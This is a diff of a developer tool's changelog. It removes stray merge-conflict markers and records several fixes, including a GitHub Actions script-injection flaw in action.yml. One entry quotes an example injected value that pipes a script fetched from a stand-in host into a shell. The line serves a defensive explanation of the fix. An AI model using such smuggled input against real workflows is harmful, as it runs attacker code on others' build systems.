@@ -13,9 +13,7 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   - `action.yml`'s install step interpolated `${{ inputs.version }}` directly into its `run:` body. A GitHub expression is substituted textually before bash parses the line, so a caller passing `version: '1.0"; curl evil | sh; "'` executes arbitrary shell in the action's step. #584 moved `args`, the PR number and the base ref into `env:` for exactly this reason and left this one behind — the sweep it described in the plural was done in the singular.
   - Now passed as `INPUT_VERSION` through `env:` like every other caller-supplied input.
   - The guard is a rule over every step, not an assertion about one line: no `run:` body may contain a `${{ }}` expression, with a vacuity check so it cannot pass when there are no run bodies left, and a positive counterpart asserting each input still reaches the script through `env:`.
-=======
 
->>>>>>> eb43eaa (test(patches): cover the three error branches nothing executed (#607))
 - **`jury apply` Previews And Confirms Before It Writes** (#605): a destructive command no longer writes unannounced.
   - `--dry-run` prints the paths each suggestion would touch and writes nothing.
   - The preview is printed **before** any write, and comes from the same `git apply --check` probe the containment check uses — so it cannot disagree with what an apply would do, and it names a path the suggestion itself never claims (a rename target). Previously the per-suggestion output appeared *after* the write had happened.
@@ -33,7 +31,12 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   - Reachable only via `jury apply` run locally against a report derived from an untrusted diff; `action.yml` does not invoke it.
 
 ### Fixed
-<<<<<<< HEAD
+- **Conflict Markers Published In The Changelog** (#615):
+  - Three unresolved git conflict markers sat in `CHANGELOG.md` on `main` from #601 (2026-08-24) until now, rendered in the published changelog. No content was lost — the #606 and #607 entries were both present and correctly placed; the three lines were residue from a resolution that kept both sides and never removed the scaffolding.
+  - The markers are the symptom. The defect is that nothing asserted their absence, so every CI run in between was green on a file containing `>>>>>>>`.
+  - `tests/test_no_conflict_markers.py` scans the tracked set from `git ls-files` — not a hand-listed glob, so a new file type is covered the day it lands. It refuses all three markers, `=======` included: dropping the separator would let a resolution that leaves only *it* behind pass, which is the same half-finished merge.
+  - Exactly seven characters, alone or followed by a space, so an eight-bracket quoted reply and an indented line are not matches — all three asserted.
+  - The scan carries a vacuity floor and pins `CHANGELOG.md` as tracked: a scan that reads nothing otherwise passes for the wrong reason. Verified against the real residue, which it reports by file and line number.
 - **`jury init` Offered Seven of Eleven Agents** (#606):
   - `KNOWN_AGENTS` is derived from `agent_templates()` instead of hand-listed. Four templates — `openrouter`, `deepseek`, `groq`, `aider` — shipped without ever reaching the tuple, so `--list-agents`, the wizard and `--preset all` could not see them while the unknown-agent error message named them. The CLI told users to choose from four options it never offered. #589 asked for exactly this and #590 rewrote the error message instead.
   - Adding them naively broke `jury init --preset thorough` outright: three point at real vendor hosts, and the config validator refuses a non-loopback endpoint without `JURY_ALLOW_REMOTE_ENDPOINT`, so the generated config was rejected before it could be written. They are now listed and selectable by name always, and included in an "all" preset only once the opt-in is present.
